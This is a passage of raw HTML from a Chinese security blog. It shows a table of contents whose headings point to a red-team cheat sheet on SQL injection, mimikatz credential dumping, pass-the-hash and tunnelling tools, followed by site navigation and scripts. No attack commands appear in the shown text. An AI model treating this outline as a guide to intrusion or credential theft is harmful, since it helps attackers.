class="toc-text">Oracle SQL 注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E7%89%88%E6%9C%AC"><span class="toc-number">1.46.5.</span> <span class="toc-text">Oracle SQL 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">1.46.6.</span> <span class="toc-text">Oracle SQL 主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">1.46.7.</span> <span class="toc-text">Oracle SQL 数据库名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E8%AF%81"><span class="toc-number">1.46.8.</span> <span class="toc-text">Oracle SQL 数据库凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.46.9.</span> <span class="toc-text">Oracle SQL 列出数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E5%88%97%E5%87%BA%E5%88%97"><span class="toc-number">1.46.10.</span> <span class="toc-text">Oracle SQL 列出列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E5%88%97%E5%87%BA%E8%A1%A8"><span class="toc-number">1.46.11.</span> <span class="toc-text">Oracle SQL 列出表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.46.12.</span> <span class="toc-text">Oracle SQL 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.46.13.</span> <span class="toc-text">Oracle SQL 盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.46.14.</span> <span class="toc-text">Oracle SQL 时间注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-SQL-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.46.14.1.</span> <span class="toc-text">Oracle SQL 命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-Java-Execution"><span class="toc-number">1.46.14.2.</span> <span class="toc-text">Oracle Java Execution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-Java-Class"><span class="toc-number">1.46.14.3.</span> <span class="toc-text">Oracle Java Class</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#References-1"><span class="toc-number">1.46.15.</span> <span class="toc-text">References</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgresql"><span class="toc-number">1.47.</span> <span class="toc-text">postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.47.1.</span> <span class="toc-text">PostgreSQL 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019%E2%80%939193"><span class="toc-number">1.47.1.1.</span> <span class="toc-text">CVE-2019–9193</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-libc-so-6"><span class="toc-number">1.47.2.</span> <span class="toc-text">使用 libc.so.6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.47.3.</span> <span class="toc-text">PostgreSQL 注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E9%93%BE%E6%B3%A8%E5%85%A5%E7%82%B9%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.47.4.</span> <span class="toc-text">PostgreSQL 链注入点符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E7%89%88%E6%9C%AC"><span class="toc-number">1.47.5.</span> <span class="toc-text">PostgreSQL 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">1.47.6.</span> <span class="toc-text">PostgreSQL 当前用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.7.</span> <span class="toc-text">PostgreSQL 用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.8.</span> <span class="toc-text">PostgreSQL 密码哈希列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.9.</span> <span class="toc-text">查询数据库管理员账户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%9D%83%E9%99%90%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.10.</span> <span class="toc-text">PostgreSQL 权限列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7"><span class="toc-number">1.47.11.</span> <span class="toc-text">查询当前用户是否为超级用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">1.47.12.</span> <span class="toc-text">PostgreSQL 数据库名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.13.</span> <span class="toc-text">PostgreSQL 数据库列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E8%A1%A8%E6%A0%BC%E5%88%97%E8%A1%A8"><span class="toc-number">1.47.14.</span> <span class="toc-text">PostgreSQL 表格列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E5%88%97%E8%A1%A8%E5%88%97"><span class="toc-number">1.47.15.</span> <span class="toc-text">PostgreSQL 列表列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.47.16.</span> <span class="toc-text">PostgreSQL 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-XML-%E5%B8%AE%E5%8A%A9%E5%99%A8"><span class="toc-number">1.47.17.</span> <span class="toc-text">PostgreSQL XML 帮助器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.47.18.</span> <span class="toc-text">PostgreSQL 盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.47.19.</span> <span class="toc-text">PostgreSQL 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.47.20.</span> <span class="toc-text">PostgreSQL 堆叠查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.47.21.</span> <span class="toc-text">PostgreSQL 文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.47.22.</span> <span class="toc-text">PostgreSQL 文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.47.23.</span> <span class="toc-text">绕过过滤器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.48.</span> <span class="toc-text">工具使用命令速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.49.</span> <span class="toc-text">mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">1.49.1.</span> <span class="toc-text">获取登录凭证信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lsass-exe-%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE"><span class="toc-number">1.49.2.</span> <span class="toc-text">lsass.exe 导出凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-PTH-%E4%BC%A0%E9%80%92-cmd"><span class="toc-number">1.49.3.</span> <span class="toc-text">mimikatz PTH 传递 cmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-PTH-%E4%BC%A0%E9%80%92-mstsc"><span class="toc-number">1.49.4.</span> <span class="toc-text">mimikatz PTH 传递 mstsc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE"><span class="toc-number">1.49.5.</span> <span class="toc-text">SAM 数据库导出凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bat-%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-number">1.49.6.</span> <span class="toc-text">bat 脚本获取凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash"><span class="toc-number">1.49.7.</span> <span class="toc-text">导出域内所有用户hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxy-tools"><span class="toc-number">1.50.</span> <span class="toc-text">proxy tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iox"><span class="toc-number">1.50.1.</span> <span class="toc-text">iox</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#proxy"><span class="toc-number">1.50.1.1.</span> <span class="toc-text">proxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fwd"><span class="toc-number">1.50.1.2.</span> <span class="toc-text">fwd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fuso"><span class="toc-number">1.50.2.</span> <span class="toc-text">fuso</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#socks"><span class="toc-number">1.50.2.1.</span> <span class="toc-text">socks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readme"><span class="toc-number">1.50.2.2.</span> <span class="toc-text">readme</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pingtunnel-frp-%E6%90%AD-icmp-%E9%9A%A7%E9%81%93"><span class="toc-number">1.50.3.</span> <span class="toc-text">pingtunnel+frp 搭 icmp 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%8E%A7%E6%9C%BA"><span class="toc-number">1.50.3.1.</span> <span class="toc-text">被控机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFfrp%E9%85%8D%E7%BD%AE"><span class="toc-number">1.50.3.2.</span> <span class="toc-text">客户端frp配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VPS"><span class="toc-number">1.50.3.3.</span> <span class="toc-text">VPS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP"><span class="toc-number">1.50.4.</span> <span class="toc-text">FRP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.50.5.</span> <span class="toc-text">代理工具列表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.51.</span> <span class="toc-text">后渗透工具列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#f8x"><span class="toc-number">1.51.1.</span> <span class="toc-text">f8x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Supershell"><span class="toc-number">1.51.2.</span> <span class="toc-text">Supershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Viper"><span class="toc-number">1.51.3.</span> <span class="toc-text">Viper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sliver-C2"><span class="toc-number">1.51.4.</span> <span class="toc-text">Sliver C2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impacket"><span class="toc-number">1.51.5.</span> <span class="toc-text">Impacket</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/10/13/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5-%E6%B4%9E%E6%9F%A5%E6%96%87%E5%BA%93/" title="红队命令速查-洞查文库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队命令速查-洞查文库"/></a><div class="content"><a class="title" href="/2024/10/13/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5-%E6%B4%9E%E6%9F%A5%E6%96%87%E5%BA%93/" title="红队命令速查-洞查文库">红队命令速查-洞查文库</a><time datetime="2024-10-13T08:07:27.000Z" title="发表于 2024-10-13 16:07:27">2024-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/IDA9.0%20%E7%A0%B4%E8%A7%A3/" title="IDA9.0 破解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://www.dmoe.cc/random.php?_r_=4787c864-fd8f-214b-01ca-507d9821d509" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IDA9.0 破解"/></a><div class="content"><a class="title" href="/2024/08/18/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/IDA9.0%20%E7%A0%B4%E8%A7%A3/" title="IDA9.0 破解">IDA9.0 破解</a><time datetime="2024-08-18T10:29:08.000Z" title="发表于 2024-08-18 18:29:08">2024-08-18</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="/atom.xml" title="RSS"><i class="anzhiyufont anzhiyu-icon-rss"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/10/18/652ec6e6bfd3a.gif" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/L1ulee" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><div class="copyright">&copy;2021 - 2024 By L1ulee</div><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shields.io/badge/L1ulee%E3%81%AE%E4%B8%87%E4%BA%8B%E5%B1%8B-%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E4%B8%AD-white?style=social&amp;logo=Exercism" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v7.3.0" title="博客框架为Hexo_v7.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v7.3.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">1</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.2sec.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=7342230281&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>1</sup></a><a href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" style="font-size: 0.88rem;">资源分享<sup>2</sup></a><a href="/tags/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" style="font-size: 0.88rem;">逆向破解<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="7342230281" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=7342230281&amp;userid=1704521144&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
